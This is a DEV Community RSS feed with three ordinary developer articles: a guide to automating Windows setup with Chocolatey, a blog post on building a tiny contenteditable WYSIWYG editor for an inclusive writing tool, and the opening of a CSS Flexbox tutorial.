<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>DEV Community</title>
    <author>DEV Community</author>
    <description>A constructive and inclusive social network for software developers. With you every step of your journey.</description>
    <link>https://dev.to</link>
    <language>en</language>
    <item>
      <title>Automating Windows Setup via Chocolatey</title>
      <author>Vinay Hegde</author>
      <pubDate>Sun, 25 Jul 2021 17:21:10 +0000</pubDate>
      <link>https://dev.to/vinayhegde1990/automating-windows-setup-via-chocolatey-13p3</link>
      <guid>https://dev.to/vinayhegde1990/automating-windows-setup-via-chocolatey-13p3</guid>
      <description>&lt;p&gt;When you're a software professional, 1 thing you must've dreaded is setting up a new Windows machine (&lt;em&gt;as in a development environment&lt;/em&gt;). This might be since doing so needs either downloading multiple .MSI / .EXE files of the required applications or using the Microsoft App Store (&lt;em&gt;personally I believe it's a little off the mark compared to the Linux/MacOS&lt;/em&gt;).  &lt;/p&gt;

&lt;p&gt;It's also compounded by the fact Windows systems are regarded relatively volatile so we never re-touch/re-configure applications once installed. You also must've surely wondered why Windows trails Linux/Mac OS when it comes to Command Line. Agreed, &lt;strong&gt;&lt;a href="https://docs.microsoft.com/en-us/powershell"&gt;PowerShell&lt;/a&gt;&lt;/strong&gt; changes most of that but learning a new syntax can be a little harrowing.&lt;/p&gt;

&lt;p&gt;What if I told you this could be solved permanently via CLI? Enter Chocolatey to the rescue.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://i.giphy.com/media/dW5tjSvxH1l94rDP06/giphy.gif" class="article-body-image-wrapper"&gt;&lt;img src="https://i.giphy.com/media/dW5tjSvxH1l94rDP06/giphy.gif"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Chocolatey is a package manager specifically designed for Windows systems to solve these very problems. Consider it equivalent to &lt;code&gt;apt-get&lt;/code&gt;, &lt;code&gt;dnf&lt;/code&gt; or &lt;code&gt;brew&lt;/code&gt; giving you sufficient power to work with Windows, so much that you might never go back to tedious manual methods again.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#prerequisites"&gt;
  &lt;/a&gt;
  Prerequisites:
&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Understanding how Powershell policies work such as &lt;code&gt;Set-ExecutionPolicy&lt;/code&gt;, &lt;a href="https://adamtheautomator.com/set-executionpolicy"&gt;here&lt;/a&gt; is an excellent page to get you started.&lt;/li&gt;
&lt;li&gt;From the &lt;a href="https://docs.chocolatey.org/en-us/choco/setup"&gt;Chocolatey official page&lt;/a&gt; 

&lt;ul&gt;
&lt;li&gt;Windows 7+ / Windows Server 2003+&lt;/li&gt;
&lt;li&gt;PowerShell v2+ (&lt;em&gt;Not PowerShell Core, minimum is v3&lt;/em&gt;)&lt;/li&gt;
&lt;li&gt;.NET Framework 4+ (&lt;em&gt;installation attempts to install .NET 4.0 if absent, minimum is v4.5 due to TLS v1.2&lt;/em&gt;)&lt;/li&gt;
&lt;/ul&gt;


&lt;/li&gt;
&lt;li&gt;Excitement to learn something new and preferably a cup of tea/coffee.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#steps"&gt;
  &lt;/a&gt;
  Steps:
&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Follow &lt;a href="https://docs.chocolatey.org/en-us/choco/setup#installing-chocolatey"&gt;this link&lt;/a&gt; to install Chocolatey.&lt;/li&gt;
&lt;li&gt;If you get an error like below, then install PowerShell v7.3 using &lt;a href="https://docs.microsoft.com/en-us/powershell/scripting/install/installing-powershell-core-on-windows?view=powershell-7.1#installing-the-msi-package"&gt;these steps&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;'Get-ExecutionPolicy' is not recognized as the name of a cmdlet
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;ul&gt;
&lt;li&gt;If you've successfully installed Chocolatey, you should now be able to run &lt;code&gt;choco --version&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;And that's it if you prefer the vanilla install but if you like to dive deeper, you'll quickly realize a few concerns.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;How can we install specific versions of software as needed?&lt;/li&gt;
&lt;li&gt;What if we wanted to install multiple applications in 1 go, uninterrupted?&lt;/li&gt;
&lt;li&gt;Can we rollout to multiple machines? (&lt;em&gt;Note: some features for this point may need Chocolatey enterprise, please read the documentation as per your use-cases&lt;/em&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Lets answer the 1st two questions. &lt;/p&gt;

&lt;p&gt;Number 1 is pretty simple, you just execute &lt;code&gt;choco install vlc={version}&lt;/code&gt; and relax. Number 2 can be a little bit tricky but a handy way is to use the &lt;a href="https://docs.chocolatey.org/en-us/choco/commands/install#packages.config"&gt;Packages.config&lt;/a&gt; which is an XML file containing the list of applications we want to install. &lt;/p&gt;

&lt;p&gt;Now the command becomes &lt;code&gt;choco install {path-to-file.config} --yes&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://github.com/vinayhegde1990/initial-workstation-config/tree/master/powershell/chocolatey"&gt;Here&lt;/a&gt; is a sample that you can use or create one/more referring it as per your requirements. You can also keep it under version control to have an audit for changes.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#result"&gt;
  &lt;/a&gt;
  Result?
&lt;/h2&gt;

&lt;p&gt;On a fresh Windows 10 machine, it took me ~35 minutes to install everything, including time to download software as well. Then I use my own curated &lt;code&gt;.dotfiles&lt;/code&gt; for certain tools to finish the development setup so I hope this guide helps you save time/effort as well.&lt;/p&gt;




&lt;p&gt;What are the ways you use to setup Windows environments?&lt;/p&gt;

</description>
      <category>powershell</category>
      <category>windows</category>
      <category>automation</category>
      <category>devops</category>
    </item>
    <item>
      <title>Designing the ultimate (INCLUSIVE) writing tool. [Part 1 - a WYSIWYG in 745 *Bytes*! 😱]</title>
      <author>InHuOfficial</author>
      <pubDate>Sun, 25 Jul 2021 17:01:47 +0000</pubDate>
      <link>https://dev.to/inhuofficial/designing-the-ultimate-inclusive-writing-tool-part-1-a-wysiwyg-in-745-bytes-ggh</link>
      <guid>https://dev.to/inhuofficial/designing-the-ultimate-inclusive-writing-tool-part-1-a-wysiwyg-in-745-bytes-ggh</guid>
      <description>&lt;p&gt;A WYSIWYG in just 745 bytes of JS (gzipped)? Check. A bonus JS syntax highlighter in 900 bytes of JS? Check. Combining the two? You bet! Things are about to get weird, but I do have a good reason for (most of) it!&lt;/p&gt;

&lt;p&gt;In this article I will be introducing a new series all around creating the ultimate &lt;strong&gt;inclusive&lt;/strong&gt; writing tool and the inspiration behind it. &lt;/p&gt;

&lt;p&gt;And obviously, as promised, a super tiny WYSIWYG...you might be surprised how "full featured" it is!&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#skip-to-the-wysiwygs"&gt;
  &lt;/a&gt;
  Skip to the WYSIWYG(s)!
&lt;/h2&gt;

&lt;p&gt;Can't be bothered reading all he really interesting features I am building or what this series will be about? How rude!&lt;/p&gt;

&lt;p&gt;But I understand you might be busy, so here is a &lt;a href="#a-basic-wysiwyg"&gt;shortcut to the first stage of the WYSIWYG.&lt;/a&gt;...and the syntax highlighter...of course!&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#introduction-to-this-series-and-where-it-started"&gt;
  &lt;/a&gt;
  Introduction to this series and where it started
&lt;/h2&gt;

&lt;p&gt;There was a &lt;a href="https://dev.to/devteam/dev-community-ableist-language-maintaining-an-inclusive-environment-37g3"&gt;really interesting article&lt;/a&gt; released by &lt;a class="mentioned-user" href="https://dev.to/michaeltharrington"&gt;@michaeltharrington&lt;/a&gt;
 earlier this week on ableism and language choice. &lt;/p&gt;

&lt;p&gt;Now it may have appeared from &lt;a href="https://dev.to/inhuofficial/comment/1gfan"&gt;a very long comment I made&lt;/a&gt; that I did not agree that language choice is important. &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;It is&lt;/strong&gt;, it was my lack of faith in being able to police it effectively and the examples of "good substitutes" for potentially offensive words that I took issue with. Plus so much of ableist language is contextual.&lt;/p&gt;

&lt;p&gt;It really got me thinking though...&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#out-of-a-simple-article-an-idea-was-born"&gt;
  &lt;/a&gt;
  Out of a simple article an idea was born.
&lt;/h2&gt;

&lt;p&gt;The article prompted me to start having a think about how you could make it easier for people to write inclusively. &lt;/p&gt;

&lt;p&gt;Without making assumptions about the culture, whether they had a limited vocabulary due to a disability or due to a lack of access to educational resources or because English was a second or even third language etc.&lt;/p&gt;

&lt;p&gt;Basically a piece of software that could steer people towards language that was suitable in a professional / public setting.&lt;/p&gt;

&lt;p&gt;All without the need for a human to intervene, as no matter how well intentioned, you will never have enough information about the writer to know whether you are doing more harm than good.&lt;/p&gt;

&lt;p&gt;A set of guidelines if you will, with the option to ignore them if you wish. &lt;/p&gt;

&lt;p&gt;The one big advantage of this approach is that software is far less likely (although not perfectly unlikely) to make people feel that they are being criticised for their language choices. &lt;/p&gt;

&lt;p&gt;It also scales so that thousands of people can benefit from guidance without the need for more and more human moderators.&lt;/p&gt;

&lt;p&gt;Although ableist language was the catalyst for the idea, inclusive writing is about so much more!&lt;/p&gt;

&lt;p&gt;&lt;a&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#not-just-ableist-language-far-from-it"&gt;
  &lt;/a&gt;
  Not just ableist language, far from it!
&lt;/h2&gt;

&lt;p&gt;Inclusive writing includes keeping an eye on pronoun use, avoiding racist language, avoiding language that excludes non-binary individuals, swear words being over-used (as the occasional "fuck yeah" is obviously desirable 😉) and more I probably haven't thought of yet.&lt;/p&gt;

&lt;p&gt;There are even more aspects to inclusive language, not just choice of words!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;"passive voice vs active voice"&lt;/strong&gt; is one, I will explain passive voice and why to avoid it in a future article when we build the part of the system that highlights passive voice and suggests alternatives that use active voice. &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Headings structure&lt;/strong&gt;, essential for people who use a screen reader and for helping everyone understand the relationships in the article etc.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Sentence length&lt;/strong&gt;, as longer sentences are more difficult to process without a "mini break" provided by a full stop, comma etc.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Complex words and jargon&lt;/strong&gt; should be avoided where possible. 1 in 5 people &lt;strong&gt;in the UK&lt;/strong&gt; have the reading age expected of that of a 12 year old. This one is a big point!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Explaining abbreviations.&lt;/strong&gt; One that we often don't think about. Just because you know what "SSR" means doesn't mean everyone does. &lt;/p&gt;

&lt;p&gt;Does it mean "Strategic Scientific Reserve", "Same Sex Relationship" or "Sonic and the Secret Rings". When writing about tech you &lt;em&gt;probably&lt;/em&gt; mean "Server Side Rendering" but that may not be obvious to someone who does not know the term. &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Paragraph length.&lt;/strong&gt; This depends almost entirely on &lt;strong&gt;what&lt;/strong&gt; you are writing and &lt;strong&gt;where&lt;/strong&gt;. &lt;/p&gt;

&lt;p&gt;However this is a tool designed for writing on the web. So short paragraphs are much preferred than walls of text. In fact, most of the preferred ways of writing for the web would get you marked down in English classes!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;grammatical errors&lt;/strong&gt; I am not smart enough to write an application to correct for grammatical errors, so I won't be tackling that (initially, who knows if this project grows I might attempt it!)...there are plenty of services that do that already, so I think I can get away with shelving that for now.&lt;/p&gt;

&lt;p&gt;Those are all the things to do with language I could think of.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#oh-and-it-doesnt-stop-there"&gt;
  &lt;/a&gt;
  Oh and it doesn't stop there
&lt;/h3&gt;

&lt;p&gt;Now that I have decided to put a couple of hours a week aside for this there are loads of things I personally have wanted in a writing system.&lt;/p&gt;

&lt;p&gt;So it might become much more than just an editor, it may have a whole system around it. A few things that I would like to see if I build this are as follows:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;strong&gt;A research tool&lt;/strong&gt;, where I can bookmark articles (at the relevant part of the page if necessary) and link them to an article I am researching.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;A simple SEO tool&lt;/strong&gt; that ensures that my first 200 words or so are optimised. Simple stats like word occurrence, semantically similar words etc. Nothing too heavy here as quality writing comes first, just a little nudge to help on-page SEO.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Templates&lt;/strong&gt; for different article types.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;A "scratch pad"&lt;/strong&gt; for notes and ideas as the article is written (things I need to research further etc.)&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Placeholders.&lt;/strong&gt; For things like images that need sourcing (or screenshots I need to take / insert), links to future articles (with a way of adding them to a queue) or related articles not written yet, notes for myself, etc. Basically things that will not show up in the released article but can be searched and acted upon.&lt;/li&gt;
&lt;li&gt;And heck, while we are at it, why not have an &lt;strong&gt;article release checklist&lt;/strong&gt; that ensures that I have completed all the steps required to release quality content and see where I am up to when writing multiple articles simultaneously.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Oh, and as always with anything I do, load speed is essential and the thing needs to be as accessible as is humanly possible with current technology. &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#stage-1-building-my-first-ever-wysiwyg"&gt;
  &lt;/a&gt;
  Stage 1 - building my first ever WYSIWYG
&lt;/h2&gt;

&lt;p&gt;I have built a What You See Is What You Get (WYSIWYG) editor for dev.to in the past. However it wasn't a WYSIWYG, it was a Markdown editor. &lt;/p&gt;


&lt;div class="ltag__link"&gt;
  &lt;a href="/inhuofficial" class="ltag__link__link"&gt;
    &lt;div class="ltag__link__pic"&gt;
      &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--VQXAgM3l--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--GddQJU2N--/c_fill%2Cf_auto%2Cfl_progressive%2Ch_150%2Cq_66%2Cw_150/https://dev-to-uploads.s3.amazonaws.com/uploads/user/profile_image/551686/52e35d4c-a986-401b-9bca-6ace4c8947d1.gif" alt="inhuofficial"&gt;
    &lt;/div&gt;
  &lt;/a&gt;
  &lt;a href="/inhuofficial/dev-to-markdown-editor-part-deux-massive-improvements-hack-2-continued-5mp" class="ltag__link__link"&gt;
    &lt;div class="ltag__link__content"&gt;
      &lt;h2&gt;7 new features, 51.3 new bugs added 😋, the DEV.TO 👩‍💻👨‍💻 editor [PART DEUX!]&lt;/h2&gt;
      &lt;h3&gt;InHuOfficial ・ Apr 7 ・ 8 min read&lt;/h3&gt;
      &lt;div class="ltag__link__taglist"&gt;
        &lt;span class="ltag__link__tag"&gt;#javascript&lt;/span&gt;
        &lt;span class="ltag__link__tag"&gt;#showdev&lt;/span&gt;
        &lt;span class="ltag__link__tag"&gt;#webdev&lt;/span&gt;
        &lt;span class="ltag__link__tag"&gt;#productivity&lt;/span&gt;
      &lt;/div&gt;
    &lt;/div&gt;
  &lt;/a&gt;
&lt;/div&gt;


&lt;p&gt;So I can't reuse any of that as I want this to be an actual WYSIWYG. &lt;/p&gt;

&lt;p&gt;No I am going to have to start from scratch and learn all about live editors on the web!&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#some-of-you-are-thinking-you-must-like-pain-if-you-are-going-to-build-a-wysiwyg"&gt;
  &lt;/a&gt;
  Some of you are thinking "You must like pain if you are going to build a WYSIWYG!"
&lt;/h3&gt;

&lt;p&gt;For those of you who have been brave enough to try and write a WYSIWYG before, you are already wincing and know that what I have decided to tackle is a horrendous task!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;WYSIWYGs are hard to build.&lt;/strong&gt; &lt;/p&gt;

&lt;p&gt;How do you let people edit a document while generating the underlying HTML on the fly and not upset / change their cursor position?&lt;/p&gt;

&lt;p&gt;How do you keep track of opening and closing HTML tags when they start getting nested? &lt;/p&gt;

&lt;p&gt;How do you account for deleting a word or phrase that has styling applied to only part of it and move the tags accordingly?&lt;/p&gt;

&lt;p&gt;All sounds rather complicated. I don't like complicated so I think the only real answer would be to &lt;strong&gt;cheat&lt;/strong&gt;!&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#our-cheat-and-why-raw-contenteditable-endraw-is-awesome"&gt;
  &lt;/a&gt;
  Our cheat and why &lt;code&gt;contenteditable&lt;/code&gt; is awesome.
&lt;/h3&gt;

&lt;p&gt;A large number of you will have used, heard of or stumbled across &lt;code&gt;contenteditable&lt;/code&gt; in your careers.&lt;/p&gt;

&lt;p&gt;If you haven't, it is an attribute you can add to an HTML element that &lt;strong&gt;magically&lt;/strong&gt; allows you to click the element and start changing the content.&lt;/p&gt;

&lt;p&gt;The following fiddle demonstrates this in its simplest form.&lt;/p&gt;

&lt;p&gt;&lt;iframe src="https://jsfiddle.net/qzeda68m//embedded/result,js//dark" width="100%" height="600"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;Now that may not seem very impressive on its own. But it really is when you think about it. &lt;/p&gt;

&lt;p&gt;It is much more than just a replacement for an &lt;code&gt;&amp;lt;input&amp;gt;&lt;/code&gt;. Every change you make is directly updating the DOM and adjusting the HTML on the fly.&lt;/p&gt;

&lt;p&gt;Still not impressed? Select some text and press Ctrl + B (on Windows). The &lt;code&gt;contenteditable&lt;/code&gt; &lt;code&gt;&amp;lt;div&amp;gt;&lt;/code&gt; has just changed to include a &lt;code&gt;&amp;lt;b&amp;gt;&lt;/code&gt; tag wrapped around your text. &lt;/p&gt;

&lt;p&gt;It deals with all of the HTML tag management so we don't have to.&lt;/p&gt;

&lt;p&gt;But not only that, a &lt;code&gt;contenteditable&lt;/code&gt; area has a super power. It exposes various JavaScript APIs so we can get and set the state of text!&lt;/p&gt;

&lt;p&gt;Sure, it has loads of quirks, but I think it is pretty amazing how much functionality you get from one single attribute (even if it is a real pain to type correctly!).&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#a-basic-wysiwyg"&gt;
  &lt;/a&gt;
  A basic WYSIWYG
&lt;/h2&gt;

&lt;p&gt;It is worth noting, there is still a load to do here. It has some accessibility issues (read that as &lt;em&gt;a lot&lt;/em&gt; of accessibility issues) so it shouldn't be used in production, it is also missing loads of features etc.&lt;/p&gt;

&lt;p&gt;However the aim here was to build a tiny WYSIWYG as a base.&lt;/p&gt;

&lt;p&gt;At this point, it is a technical showpiece and a learning exercise for me on all the APIs I need to learn to interact with a &lt;code&gt;contenteditable&lt;/code&gt; &lt;code&gt;&amp;lt;div&amp;gt;&lt;/code&gt;, &lt;strong&gt;not the finished product.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Anyway, enough disclaimers, I know what you came here to see!&lt;/p&gt;

&lt;p&gt;The following WYSIWYG is a total of 896 &lt;strong&gt;bytes&lt;/strong&gt; of JS &lt;strong&gt;and&lt;/strong&gt; CSS combined (when Gzipped). &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;How is that for tiny?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;iframe src="https://jsfiddle.net/y1p08sx7//embedded/result,js,css,html//dark" width="100%" height="600"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#how-about-syntax-highlighting"&gt;
  &lt;/a&gt;
  How about syntax highlighting?
&lt;/h2&gt;

&lt;p&gt;Oh you thought the WYSIWYG was the showpiece?&lt;/p&gt;

&lt;p&gt;No no no, I have been busy creating more tiny experiments.&lt;/p&gt;

&lt;p&gt;A lot of them still need a lot of work but just for fun how about a super tiny JavaScript syntax highlighter?&lt;/p&gt;

&lt;p&gt;&lt;iframe src="https://jsfiddle.net/zgpx364s//embedded/result,js,css,html//dark" width="100%" height="600"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;That was another interesting learning exercise (luckily a lot of the regexes were available with a bit of research so I didn't have to write them, just tweak them!). &lt;/p&gt;

&lt;p&gt;It is not perfect but the concept is there. &lt;/p&gt;

&lt;p&gt;Now I was not intending to do anything else in this article...but I just had to try combining the two fiddles...&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#how-about-syntax-highlightingin-a-wysiwyg"&gt;
  &lt;/a&gt;
  How about Syntax highlighting...in a WYSIWYG?
&lt;/h2&gt;

&lt;p&gt;I created a monster! A weird WYSIWYG where you get syntax highlighting, but can still edit it like a normal document.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--068mV2aQ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/7nvbnonle8etii6obswc.JPG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--068mV2aQ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/7nvbnonle8etii6obswc.JPG" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;It can create some pretty interesting results I have to say....I don't think I will be using it as my day to day editor just yet!&lt;/p&gt;

&lt;p&gt;It is full of bugs as this was obviously not intended etc. etc. but...why not have some fun?&lt;/p&gt;

&lt;p&gt;Sadly you can't insert images, horizontal lines, links etc. as the input gets mangled...but you can still have a load of fun with formatting text!&lt;/p&gt;

&lt;p&gt;It might not look right on your mobile so save this one for when you get to your PC!&lt;/p&gt;

&lt;p&gt;&lt;iframe src="https://jsfiddle.net/6yrm3jgx//embedded/result//dark" width="100%" height="600"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;I hope it makes you laugh (and cry at the same time) as much as it has me!&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#back-to-the-serious-stuff"&gt;
  &lt;/a&gt;
  Back to the serious stuff!
&lt;/h2&gt;

&lt;p&gt;Obviously, while this is all fun, the intention is never to have the WYSIWYG functions as part of the Code Editor.&lt;/p&gt;

&lt;p&gt;The idea is to create a blocks system (similar to WordPress etc.) where you have a WYSIWYG block, then a code editor block, then back to a different block type etc.&lt;/p&gt;

&lt;p&gt;However there was one thing (that you may not have noticed) that was important with the code editor and combining the two that I was doing.&lt;/p&gt;

&lt;p&gt;I was seeing how I could create live highlighting as you typed.&lt;/p&gt;

&lt;p&gt;It isn't as simple as you may think, so have a good look at the code in the last example to work out what the trick is. Don't worry if you don't spot it...I will explain all the tricks etc. in more detail in the next part of this series when I tidy up my sloppy code!&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#what-is-next"&gt;
  &lt;/a&gt;
  What is next?
&lt;/h2&gt;

&lt;p&gt;OK so these were some fun experiments but not really useful.&lt;/p&gt;

&lt;p&gt;In part two I am going fix the WYSIWYG to a stage where it is both usable and more easily extended so we can start bolting in some of &lt;a href="#features"&gt;the features I listed earlier&lt;/a&gt;. &lt;/p&gt;

&lt;p&gt;I am also going to use the knowledge gained from the silly WYSIWYG code editor combo to add highlighting to words that are not recommended etc. &lt;/p&gt;

&lt;p&gt;So by the end of part two we should have a usable WYSIWYG that will allow us to highlight a given word, phrase etc. and have suggestions on alternatives. Who knows I might throw another couple of silly things in that article for you to play with too!&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h2&gt;

&lt;p&gt;From one simple article a gigantic, all consuming project that is going to take me months has emerged.&lt;/p&gt;

&lt;p&gt;That is the conclusion as far as I am concerned. &lt;/p&gt;

&lt;p&gt;So do me a favour, give me a follow, bookmark the article, leave a comment or share this article with someone you don't like so you can put then through the pain of experiencing my WYSIWYG code editor monstrosity! 🤣&lt;/p&gt;


&lt;div class="ltag__user ltag__user__id__551686"&gt;
  
    .ltag__user__id__551686 .follow-action-button {
      background-color: #c62aa4 !important;
      color: #131111 !important;
      border-color: #c62aa4 !important;
    }
  
    &lt;a href="/inhuofficial" class="ltag__user__link profile-image-link"&gt;
      &lt;div class="ltag__user__pic"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--VQXAgM3l--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--GddQJU2N--/c_fill%2Cf_auto%2Cfl_progressive%2Ch_150%2Cq_66%2Cw_150/https://dev-to-uploads.s3.amazonaws.com/uploads/user/profile_image/551686/52e35d4c-a986-401b-9bca-6ace4c8947d1.gif" alt="inhuofficial image"&gt;
      &lt;/div&gt;
    &lt;/a&gt;
  &lt;div class="ltag__user__content"&gt;
    &lt;h2&gt;
&lt;a class="ltag__user__link" href="/inhuofficial"&gt;InHuOfficial&lt;/a&gt;Follow
&lt;/h2&gt;
    &lt;div class="ltag__user__summary"&gt;
      &lt;a class="ltag__user__link" href="/inhuofficial"&gt;Specialising in accessibility and website load speed / performance. If you have a question about [accessibility] or [page-speed-insights] ask away and I will help any way I can!&lt;/a&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/div&gt;


&lt;p&gt;Have a great week and I hope you found this interesting, even if it wasn't useful (yet...that is what part two is for I hope!)&lt;/p&gt;

</description>
      <category>a11y</category>
      <category>showdev</category>
      <category>webdev</category>
      <category>javascript</category>
    </item>
    <item>
      <title>Complete Introduction to CSS Flexbox 💪</title>
      <author>Rocky</author>
      <pubDate>Sun, 25 Jul 2021 16:47:46 +0000</pubDate>
      <link>https://dev.to/coderzx/complete-introduction-to-css-flexbox-egb</link>
      <guid>https://dev.to/coderzx/complete-introduction-to-css-flexbox-egb</guid>
      <description>&lt;p&gt;Flexbox is a powerful, well-supported layout method that was introduced with the latest version of CSS, CSS3. With flexbox, it's easy to center elements on the page and create dynamic user interfaces that shrink and expand automatically.&lt;/p&gt;
&lt;p&gt;Life was tough before Flexbox and Grid came, centering a div was so troublesome that it became a meme.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--oCTpefFj--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/4b8o33jlsb1q7ed5n9us.jpg"&gt;&lt;img alt="meme" src="https://res.cloudinary.com/practicaldev/image/fetch/s--aMBoG3Mq--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--oCTpefFj--/c_limit%252Cf_auto%252Cfl_progressive%252Cq_auto%252Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/4b8o33jlsb1q7ed5n9us.jpg"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;But fear no more, Flexbox and Grid have solved all our problems and things are so much easier now.&lt;/p&gt;
&lt;p&gt;In this blog, we'll learn the fundamentals of flexbox and dynamic layouts.&lt;/p&gt;
&lt;h2&gt;
&lt;a href="https://dev.to/cenacr007_harsh/complete-introduction-to-css-flexbox-1fhl#use-raw-display-flex-endraw-to-position-two-boxes"&gt;&lt;/a&gt;📌 Use &lt;code&gt;display: flex&lt;/code&gt; to Position Two Boxes&lt;/h2&gt;
&lt;p&gt;Placing the CSS property &lt;code&gt;display: flex&lt;/code&gt; on an element allows you to use other flex properties to build a responsive page.&lt;/p&gt;
&lt;p&gt;For example:&lt;/p&gt;
&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--hLoD2x-f--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/6i9iry6hv4rddo54lsa9.png"&gt;&lt;img alt="1" src="https://res.cloudinary.com/practicaldev/image/fetch/s--C7lC-okP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--hLoD2x-f--/c_limit%252Cf_auto%252Cfl_progressive%252Cq_auto%252Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/6i9iry6hv4rddo54lsa9.png"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;After applying &lt;code&gt;display: flex&lt;/code&gt; property to parent element:&lt;/p&gt;
&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--pI5jZiPa--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ebnk1l1n05v95xwtsj6l.jpg"&gt;&lt;img alt="parent" src="https://res.cloudinary.com/practicaldev/image/fetch/s--qv2IIqsW--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--pI5jZiPa--/c_limit%252Cf_auto%252Cfl_progressive%252Cq_auto%252Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ebnk1l1n05v95xwtsj6l.jpg"&gt;&lt;/a&gt;&lt;/p&gt;
